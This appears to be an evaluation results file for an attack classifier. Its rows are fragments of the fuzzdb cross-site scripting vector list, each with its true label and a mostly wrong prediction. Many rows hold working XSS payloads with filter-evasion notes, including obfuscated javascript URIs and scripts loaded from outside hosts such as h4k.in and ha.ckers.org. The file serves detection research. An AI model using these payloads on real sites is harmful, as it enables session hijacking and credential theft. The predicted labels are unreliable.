id,payload,actual,predicted
fuzzdb_1060,Author Name: .mario,xss,benign
fuzzdb_1061,IE closing-tag expression injection,xss,benign
fuzzdb_1062,Exploit Name: IE closing-tag expression injection,xss,benign
fuzzdb_1063,"Exploit String: </a style=""""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"">",xss,sql_injection
fuzzdb_1064,Exploit Description: This vector exploits a bug in IE whre attributes in closing comments are evaluated.,xss,benign
fuzzdb_1065,"Exploit Tags: general, injection, internet explorer",xss,benign
fuzzdb_1066,Author Name: .mario,xss,benign
fuzzdb_1067,IE expression injection,xss,benign
fuzzdb_1068,Exploit Name: IE expression injection,xss,benign
fuzzdb_1069,"Exploit String:  style=color: expression(alert(0));"" a=""",xss,benign
fuzzdb_1070,Exploit Description: This vector utilizes the feature of CSS expressions in IE.,xss,benign
fuzzdb_1071,"Exploit Tags: general, injection, internet explorer, style injection",xss,benign
fuzzdb_1072,Author Name: .mario,xss,benign
fuzzdb_1073,IE VB Messagebox injection,xss,benign
fuzzdb_1074,Exploit Name: IE VB Messagebox injection,xss,benign
fuzzdb_1076,Exploit Description: This injects VB code and produces a message box. IE only.,xss,benign
fuzzdb_1077,"Exploit Tags: general, basic, internet explorer",xss,benign
fuzzdb_1078,Author Name: .mario,xss,benign
fuzzdb_1079,IFRAME,xss,benign
fuzzdb_1080,Exploit Name: IFRAME,xss,benign
fuzzdb_1082,Exploit Description: Iframe (If iframes are allowed there are a lot of other XSS problems as well).,xss,benign
fuzzdb_1083,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1084,Author Name: ha.ckers.org,xss,benign
fuzzdb_1085,Image onerror wrapped in XML statement,xss,benign
fuzzdb_1086,Exploit Name: Image onerror wrapped in XML statement,xss,benign
fuzzdb_1087,Exploit String: a=<a>,xss,benign
fuzzdb_1088,<b>,xss,benign
fuzzdb_1089,%3c%69%6d%67%2f%73%72%63%3d%31,xss,benign
fuzzdb_1090,%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e,xss,benign
fuzzdb_1091,</b>,xss,benign
fuzzdb_1092,</a>,xss,benign
fuzzdb_1093,document.write(unescape(a..b)),xss,benign
fuzzdb_1094,Exploit Description: This vector writes an erroneous image tag with onerror hanlder inside an E4X construct into the document context.,xss,benign
fuzzdb_1095,"Exploit Tags: general, obfuscated, gecko, XML predicates, evil tags",xss,benign
fuzzdb_1096,Author Name: .mario,xss,benign
fuzzdb_1097,Image tag with obfuscated JS URI,xss,benign
fuzzdb_1098,Exploit Name: Image tag with obfuscated JS URI,xss,benign
fuzzdb_1099,"Exploit String: <IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">",xss,sql_injection
fuzzdb_1100,"<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">",xss,sql_injection
fuzzdb_1101,"<IMG SRC=""jav&#x0D;ascript:alert(<WBR>'XSS');"">",xss,sql_injection
fuzzdb_1103,"Exploit Tags: general, basic, obfuscated, evil tags, internet explorer",xss,benign
fuzzdb_1104,Author Name: OWASP,xss,benign
fuzzdb_1105,Image w/CharCode,xss,benign
fuzzdb_1106,Exploit Name: Image w/CharCode,xss,benign
fuzzdb_1107,Exploit String: <IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>,xss,sql_injection
fuzzdb_1108,Exploit Description: If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.,xss,benign
fuzzdb_1109,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss,benign
fuzzdb_1110,Author Name: ha.ckers.org,xss,benign
fuzzdb_1111,IMG Dynsrc,xss,benign
fuzzdb_1112,Exploit Name: IMG Dynsrc,xss,benign
fuzzdb_1114,Exploit Description: IMG Dynsrc,xss,benign
fuzzdb_1115,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1116,Author Name: ha.ckers.org,xss,benign
fuzzdb_1117,IMG Embedded commands 1,xss,benign
fuzzdb_1118,Exploit Name: IMG Embedded commands 1,xss,benign
fuzzdb_1120,"Exploit Description: This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.",xss,sql_injection
fuzzdb_1121,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1122,Author Name: ha.ckers.org,xss,benign
fuzzdb_1123,IMG Embedded commands 2,xss,benign
fuzzdb_1124,Exploit Name: IMG Embedded commands 2,xss,benign
fuzzdb_1125,Exploit String: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss,benign
fuzzdb_1127,"Exploit Tags: general, redirect",xss,benign
fuzzdb_1128,Author Name: ha.ckers.org,xss,benign
fuzzdb_1129,IMG Lowsrc,xss,benign
fuzzdb_1130,Exploit Name: IMG Lowsrc,xss,benign
fuzzdb_1132,Exploit Description: IMG Lowsrc,xss,benign
fuzzdb_1133,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1134,Author Name: ha.ckers.org,xss,benign
fuzzdb_1135,IMG No Quotes/Semicolon,xss,benign
fuzzdb_1136,Exploit Name: IMG No Quotes/Semicolon,xss,benign
fuzzdb_1138,Exploit Description: No quotes and no semicolon,xss,benign
fuzzdb_1139,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1140,Author Name: ha.ckers.org,xss,benign
fuzzdb_1141,IMG STYLE w/expression,xss,benign
fuzzdb_1142,Exploit Name: IMG STYLE w/expression,xss,benign
fuzzdb_1143,"Exploit String: exp/*<XSS STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",xss,sql_injection
fuzzdb_1144,"Exploit Description: IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).",xss,benign
fuzzdb_1145,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1146,Author Name: ha.ckers.org,xss,benign
fuzzdb_1147,IMG w/JavaScript Directive,xss,benign
fuzzdb_1148,Exploit Name: IMG w/JavaScript Directive,xss,benign
fuzzdb_1150,Exploit Description: Image XSS using the JavaScript directive.,xss,benign
fuzzdb_1151,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1152,Author Name: ha.ckers.org,xss,benign
fuzzdb_1153,IMG w/VBscript,xss,benign
fuzzdb_1154,Exploit Name: IMG w/VBscript,xss,benign
fuzzdb_1156,Exploit Description: VBscript in an image,xss,benign
fuzzdb_1157,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1158,Author Name: ha.ckers.org,xss,benign
fuzzdb_1159,INPUT Image,xss,benign
fuzzdb_1160,Exploit Name: INPUT Image,xss,benign
fuzzdb_1162,Exploit Description: INPUT Image,xss,benign
fuzzdb_1163,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1164,Author Name: ha.ckers.org,xss,benign
fuzzdb_1165,IP Encoding,xss,benign
fuzzdb_1166,Exploit Name: IP Encoding,xss,benign
fuzzdb_1167,"Exploit String: <A HREF=""http://66.102.7.147/"">XSS</A>",xss,benign
fuzzdb_1168,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss,benign
fuzzdb_1169,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1170,Author Name: ha.ckers.org,xss,benign
fuzzdb_1171,JavaScript concatenation vector variant 1,xss,benign
fuzzdb_1172,Exploit Name: JavaScript concatenation vector variant 1,xss,benign
fuzzdb_1173,Exploit String: s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1,xss,benign
fuzzdb_1174,Exploit Description: This vector concatenates a string and evaluates it via mapping on URL,xss,benign
fuzzdb_1175,"Exploit Tags: general, internet explorer, concatenated, obfuscated",xss,benign
fuzzdb_1176,Author Name: PHPIDS Group,xss,benign
fuzzdb_1177,JavaScript concatenation vector variant 2,xss,benign
fuzzdb_1178,Exploit Name: JavaScript concatenation vector variant 2,xss,benign
fuzzdb_1179,Exploit String: s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;,xss,benign
fuzzdb_1180,Exploit Description: This vector concatenates a string and evaluates it via self-execution.,xss,benign
fuzzdb_1181,"Exploit Tags: general, concatenated, obfuscated",xss,benign
fuzzdb_1182,Author Name: PHPIDS Group,xss,benign
fuzzdb_1183,JavaScript concatenation vector variant 3,xss,benign
fuzzdb_1184,Exploit Name: JavaScript concatenation vector variant 3,xss,benign
fuzzdb_1185,Exploit String: s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);,xss,benign
fuzzdb_1186,Exploit Description: This vector concatenates a string and evaluates it via usage of common DOM methods and element creation.,xss,benign
fuzzdb_1187,"Exploit Tags: general, concatenated, obfuscated",xss,benign
fuzzdb_1188,Author Name: PHPIDS Group,xss,benign
fuzzdb_1189,JavaScript concatenation vector variant 4,xss,benign
fuzzdb_1190,Exploit Name: JavaScript concatenation vector variant 4,xss,benign
fuzzdb_1191,Exploit String: s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];,xss,benign
fuzzdb_1192,Exploit Description: This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.,xss,benign
fuzzdb_1193,"Exploit Tags: general, JSON, concatenated, obfuscated",xss,benign
fuzzdb_1194,Author Name: PHPIDS Group,xss,benign
fuzzdb_1195,JavaScript concatenation vector variant 5,xss,benign
fuzzdb_1196,Exploit Name: JavaScript concatenation vector variant 5,xss,benign
fuzzdb_1197,Exploit String: s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];,xss,benign
fuzzdb_1198,Exploit Description: This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.,xss,benign
fuzzdb_1199,"Exploit Tags: general, JSON, concatenated, obfuscated",xss,benign
fuzzdb_1200,Author Name: PHPIDS Group,xss,benign
fuzzdb_1201,JavaScript concatenation vector variant 6,xss,benign
fuzzdb_1202,Exploit Name: JavaScript concatenation vector variant 6,xss,benign
fuzzdb_1203,Exploit String: s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;,xss,benign
fuzzdb_1204,Exploit Description: This vector concatenates a string and evaluates it via filling the URL property with payload concatenated in a string  via ternary operators.,xss,benign
fuzzdb_1205,"Exploit Tags: general, internet explorer, concatenated, obfuscated",xss,benign
fuzzdb_1206,Author Name: PHPIDS Group,xss,benign
fuzzdb_1207,JavaScript concatenation vector variant 7,xss,benign
fuzzdb_1208,Exploit Name: JavaScript concatenation vector variant 7,xss,benign
fuzzdb_1209,Exploit String: s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';,xss,benign
fuzzdb_1210,Exploit Description: This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a regular string via ternary operators.,xss,benign
fuzzdb_1211,"Exploit Tags: general, JSON, concatenated, obfuscated",xss,benign
fuzzdb_1212,Author Name: PHPIDS Group,xss,benign
fuzzdb_1213,JavaScript Includes,xss,benign
fuzzdb_1214,Exploit Name: JavaScript Includes,xss,benign
fuzzdb_1215,"Exploit String: <BR SIZE=""&{alert('XSS')}"">",xss,benign
fuzzdb_1216,Exploit Description: &JavaScript includes (works in Netscape 4.x).,xss,benign
fuzzdb_1217,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1218,Author Name: ha.ckers.org,xss,benign
fuzzdb_1219,JavaScript Link Location,xss,benign
fuzzdb_1220,Exploit Name: JavaScript Link Location,xss,benign
fuzzdb_1222,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed),xss,benign
fuzzdb_1223,JavaScript link location,xss,benign
fuzzdb_1224,"Exploit Tags: general, evil tags, obfuscated, redirect",xss,benign
fuzzdb_1225,Author Name: ha.ckers.org,xss,benign
fuzzdb_1226,JavaScript-breaker using carriage return,xss,benign
fuzzdb_1227,Exploit Name: JavaScript-breaker using carriage return,xss,benign
fuzzdb_1228,Exploit String: %0da=eval;b=alert;a(b(/d/.source));,xss,benign
fuzzdb_1229,Exploit Description: This vector uses an urlencoded carriage return to break JS code and produce an alert afterwards.,xss,benign
fuzzdb_1230,"Exploit Tags: general, JS breaking, CRLF",xss,benign
fuzzdb_1231,Author Name: kishor,xss,benign
fuzzdb_1232,JS link with whitespace obfuscation,xss,benign
fuzzdb_1233,Exploit Name: JS link with whitespace obfuscation,xss,benign
fuzzdb_1234,"Exploit String: <a href          =              ""javas  cript   :ale                            rt(1)"">test",xss,benign
fuzzdb_1235,Exploit Description: This vector utilizes whitespace to obfuscate and contains a JS link.,xss,benign
fuzzdb_1236,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1237,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1238,JS string concatenation breaker,xss,benign
fuzzdb_1239,Exploit Name: JS string concatenation breaker,xss,benign
fuzzdb_1240,Exploit String: +alert(0)+,xss,benign
fuzzdb_1241,Exploit Description: This can be used when input is concatenated in JavaScript.,xss,benign
fuzzdb_1242,"Exploit Tags: general, JS breaking, basic",xss,benign
fuzzdb_1243,Author Name: .mario,xss,benign
fuzzdb_1244,JSON based obfuscated onload vector,xss,benign
fuzzdb_1245,Exploit Name: JSON based obfuscated onload vector,xss,benign
fuzzdb_1247,Exploit Description: This vector injects a new body tag and utilized the onload event to modify the DOM. JSON parenthesis and semicolons are to evade filters.,xss,benign
fuzzdb_1248,"Exploit Tags: general, evil tags, JSON, obfuscated",xss,benign
fuzzdb_1249,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1250,JSON based onload vector,xss,benign
fuzzdb_1251,Exploit Name: JSON based onload vector,xss,benign
fuzzdb_1253,Exploit Description: This vector injects a new body tag and utilized the onload event to modify the DOM,xss,benign
fuzzdb_1254,"Exploit Tags: general, evil tags, JSON, obfuscated",xss,benign
fuzzdb_1255,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1256,JSON based semicolon-onload vector,xss,benign
fuzzdb_1257,Exploit Name: JSON based semicolon-onload vector,xss,benign
fuzzdb_1259,Exploit Description: This vector injects a new body tag and utilized the onload event to modify the DOM. Also this vector uses semicolons to obfuscate.,xss,benign
fuzzdb_1260,"Exploit Tags: general, evil tags, JSON, obfuscated",xss,benign
fuzzdb_1261,Author Name: thespanner.co.uk,xss,benign
fuzzdb_1262,LAYER,xss,benign
fuzzdb_1263,Exploit Name: LAYER,xss,benign
fuzzdb_1264,"Exploit String: <LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",xss,benign
fuzzdb_1265,Exploit Description: Layer (Older Netscape only),xss,benign
fuzzdb_1266,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1267,Author Name: ha.ckers.org,xss,benign
fuzzdb_1268,List-style-image,xss,benign
fuzzdb_1269,Exploit Name: List-style-image,xss,benign
fuzzdb_1271,Exploit Description: Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.,xss,benign
fuzzdb_1272,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1273,Author Name: ha.ckers.org,xss,benign
fuzzdb_1274,Livescript,xss,benign
fuzzdb_1275,Exploit Name: Livescript,xss,benign
fuzzdb_1277,Exploit Description: Livescript (Older Netscape only),xss,benign
fuzzdb_1278,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1279,Author Name: ha.ckers.org,xss,benign
fuzzdb_1280,Local .htc file,xss,benign
fuzzdb_1281,Exploit Name: Local .htc file,xss,benign
fuzzdb_1282,"Exploit String: <XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">",xss,benign
fuzzdb_1283,Exploit Description: This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.,xss,benign
fuzzdb_1284,"Exploit Tags: general, evil tags, internet explorer, injection",xss,benign
fuzzdb_1285,Author Name: ha.ckers.org,xss,benign
fuzzdb_1286,Long UTF-8 Unicode w/out Semicolons,xss,benign
fuzzdb_1287,Exploit Name: Long UTF-8 Unicode w/out Semicolons,xss,benign
fuzzdb_1288,Exploit String: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss,sql_injection
fuzzdb_1289,"Exploit Description: Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for ”&#XX;”, since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).",xss,sql_injection
fuzzdb_1290,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss,benign
fuzzdb_1291,Author Name: ha.ckers.org,xss,benign
fuzzdb_1292,Malformed IMG Tags,xss,benign
fuzzdb_1293,Exploit Name: Malformed IMG Tags,xss,benign
fuzzdb_1295,"Exploit Description: Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.",xss,sql_injection
fuzzdb_1296,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1297,Author Name: ha.ckers.org,xss,benign
fuzzdb_1298,Markup breaker with special quotes,xss,benign
fuzzdb_1299,Exploit Name: Markup breaker with special quotes,xss,benign
fuzzdb_1300,Exploit String: %26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//,xss,benign
fuzzdb_1301,Exploit Description: This markup breaking vector utilizes specially crafted quotes to break the existing markup.,xss,benign
fuzzdb_1302,"Exploit Tags: general, html breaking, JS breaking",xss,benign
fuzzdb_1303,Author Name: kishor,xss,benign
fuzzdb_1304,META,xss,benign
fuzzdb_1305,Exploit Name: META,xss,benign
fuzzdb_1307,Exploit Description: The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.,xss,benign
fuzzdb_1308,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1309,Author Name: ha.ckers.org,xss,benign
fuzzdb_1310,META w/additional URL parameter,xss,benign
fuzzdb_1311,Exploit Name: META w/additional URL parameter,xss,benign
fuzzdb_1313,Exploit Description: Meta with additional URL parameter. If the target website attempts to see if the URL contains an ”http://” you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com),xss,benign
fuzzdb_1314,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1315,Author Name: ha.ckers.org,xss,benign
fuzzdb_1316,META w/data:URL,xss,benign
fuzzdb_1317,Exploit Name: META w/data:URL,xss,benign
fuzzdb_1318,"Exploit String: <META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss,sql_injection
fuzzdb_1319,"Exploit Description: This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details",xss,benign
fuzzdb_1320,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1321,Author Name: ha.ckers.org,xss,benign
fuzzdb_1322,Mixed Encoding,xss,benign
fuzzdb_1323,Exploit Name: Mixed Encoding,xss,benign
fuzzdb_1324,"Exploit String: <A HREF=""http://6&#09;6.000146.0x7.147/"">XSS</A>",xss,sql_injection
fuzzdb_1325,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss,benign
fuzzdb_1326,The tabs and newlines only work if this is encapsulated with quotes.,xss,benign
fuzzdb_1327,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1328,Author Name: ha.ckers.org,xss,benign
fuzzdb_1329,Mocha,xss,benign
fuzzdb_1330,Exploit Name: Mocha,xss,benign
fuzzdb_1332,Exploit Description: Mocha (Older Netscape only),xss,benign
fuzzdb_1333,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_1334,Author Name: ha.ckers.org,xss,benign
fuzzdb_1335,Mozilla -moz-binding-url injection,xss,benign
fuzzdb_1336,Exploit Name: Mozilla -moz-binding-url injection,xss,benign
fuzzdb_1337,"Exploit String:  style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);"" a=""",xss,sql_injection
fuzzdb_1338,Exploit Description: The vector incudes a binding file via injected style attrbute. Gecko only.,xss,benign
fuzzdb_1339,"Exploit Tags: general, injection, gecko, style injection, XBL",xss,benign
fuzzdb_1340,Author Name: .mario,xss,benign
fuzzdb_1341,Mozilla -moz-binding-url injection - filter evading,xss,benign
fuzzdb_1342,Exploit Name: Mozilla -moz-binding-url injection - filter evading,xss,benign
fuzzdb_1343,"Exploit String:  sstyle=foobar""tstyle=""foobar""ystyle=""foobar""lstyle=""foobar""estyle=""foobar""=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)"" a=""",xss,sql_injection
fuzzdb_1344,Exploit Description: This vector was once used on a major site to evade a stripping filter and inject binding XML.,xss,benign
fuzzdb_1345,"Exploit Tags: general, injection, gecko, style injection, XBL",xss,benign
fuzzdb_1346,Author Name: PHPIDS Group,xss,benign
fuzzdb_1347,Multiline selfcontained XSS,xss,benign
fuzzdb_1348,Exploit Name: Multiline selfcontained XSS,xss,benign
fuzzdb_1349,Exploit String: _,xss,benign
fuzzdb_1350,=,xss,benign
fuzzdb_1351,eval,xss,benign
fuzzdb_1352,b=1,xss,benign
fuzzdb_1353,__,xss,benign
fuzzdb_1354,=,xss,benign
fuzzdb_1355,location,xss,benign
fuzzdb_1356,c=1,xss,benign
fuzzdb_1357,_,xss,benign
fuzzdb_1358,(,xss,benign
fuzzdb_1359,__,xss,benign
fuzzdb_1360,.,xss,benign
fuzzdb_1361,hash,xss,benign
fuzzdb_1362,//,xss,benign
fuzzdb_1363,.,xss,benign
fuzzdb_1364,substr,xss,benign
fuzzdb_1365,(1),xss,benign
fuzzdb_1366,),xss,benign
fuzzdb_1367,Exploit Description: This vector uses line breaks to obfuscate and evaluates the location hash.,xss,benign
fuzzdb_1368,"Exploit Tags: self contained, general, obfuscated",xss,benign
fuzzdb_1369,Author Name: .mario,xss,benign
fuzzdb_1370,Multiline w/Carriage Returns,xss,benign
fuzzdb_1371,Exploit Name: Multiline w/Carriage Returns,xss,benign
fuzzdb_1373,Exploit Description: Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).,xss,benign
fuzzdb_1374,"Exploit Tags: general, evil tags, internet explorer",xss,benign
fuzzdb_1375,Author Name: ha.ckers.org,xss,benign
fuzzdb_1376,Name contained XSS variant 1,xss,benign
fuzzdb_1377,Exploit Name: Name contained XSS variant 1,xss,benign
fuzzdb_1378,"Exploit String: b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name",xss,benign
fuzzdb_1379,Exploit Description: This vector depends on attackers ability to access the window.name property where the payload is located.,xss,benign
fuzzdb_1380,"Exploit Tags: general, name contained, obfuscated",xss,benign
fuzzdb_1381,Author Name: PHPIDS Group,xss,benign
fuzzdb_1382,Name contained XSS variant 2,xss,benign
fuzzdb_1383,Exploit Name: Name contained XSS variant 2,xss,benign
fuzzdb_1384,Exploit String: a=/ev///,xss,benign
fuzzdb_1385,.source a+=/al///,xss,benign
fuzzdb_1386,.source a[a] (name),xss,benign
fuzzdb_1387,Exploit Description: This name contained XSS requires newlines to be able to work - and access to the window.name property.,xss,benign
fuzzdb_1388,"Exploit Tags: general, name contained, obfuscated",xss,benign
fuzzdb_1389,Author Name: .mario,xss,benign
fuzzdb_1390,Name contained XSS variant 3,xss,benign
fuzzdb_1391,Exploit Name: Name contained XSS variant 3,xss,benign
fuzzdb_1392,Exploit String: a=/ev/,xss,benign
fuzzdb_1393,.source a+=/al/,xss,benign
fuzzdb_1394,".source,a = a[a] a(name)",xss,benign
fuzzdb_1395,Exploit Description: New-lined requiring name contained vector - this time not comment obfuscated so easier to detect.,xss,benign
fuzzdb_1396,"Exploit Tags: general, name contained",xss,benign
fuzzdb_1397,Author Name: PHPIDS Group,xss,benign
fuzzdb_1398,Name contained XSS variant 4,xss,benign
fuzzdb_1399,Exploit Name: Name contained XSS variant 4,xss,benign
fuzzdb_1400,Exploit String: setTimeout//,xss,benign
fuzzdb_1401,"(name// ,0)",xss,benign
fuzzdb_1402,Exploit Description: This vector utilizes the setTimeout function to fire - also it's name contained and comment-obfuscated and requires newlines.,xss,benign
fuzzdb_1403,"Exploit Tags: general, name contained, obfuscated, timed",xss,benign
fuzzdb_1404,Author Name: PHPIDS Group,xss,benign
fuzzdb_1405,navigatorurl: code execution,xss,benign
fuzzdb_1406,Exploit Name: navigatorurl: code execution,xss,benign
fuzzdb_1408,Exploit Description: This navigatorurl-uri executes the cmd.exe on vulnerable systems.,xss,benign
fuzzdb_1409,"Exploit Tags: URI exploits, gecko, injection, general",xss,benign
fuzzdb_1410,Author Name: xs-sniper,xss,benign
fuzzdb_1411,No Closing Script Tag,xss,benign
fuzzdb_1412,Exploit Name: No Closing Script Tag,xss,benign
fuzzdb_1413,Exploit String: <SCRIPT SRC=http://ha.ckers.org/xss.js,xss,benign
fuzzdb_1414,"Exploit Description: In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the ”></SCRIPT>” portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.",xss,benign
fuzzdb_1415,"Exploit Tags: general, evil tags, injection, gecko",xss,benign
fuzzdb_1416,Author Name: ha.ckers.org,xss,benign
fuzzdb_1417,No Quotes/Semicolons,xss,benign
fuzzdb_1418,Exploit Name: No Quotes/Semicolons,xss,benign
fuzzdb_1420,Exploit Description: No single quotes or double quotes or semicolons.,xss,benign
fuzzdb_1421,"Exploit Tags: general, evil tags, obfuscated",xss,benign
fuzzdb_1422,Author Name: ha.ckers.org,xss,benign
fuzzdb_1423,Non-Alpha/Non-Digit,xss,benign
fuzzdb_1424,Exploit Name: Non-Alpha/Non-Digit,xss,benign
fuzzdb_1426,Exploit Description: Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example ”<SCRIPT\s” != ”<SCRIPT/XSS\s”,xss,benign
fuzzdb_1427,"Exploit Tags: general, evil tags, injection",xss,benign
fuzzdb_1428,Author Name: ha.ckers.org,xss,benign
fuzzdb_1429,Non-Alpha/Non-Digit Part 2,xss,benign
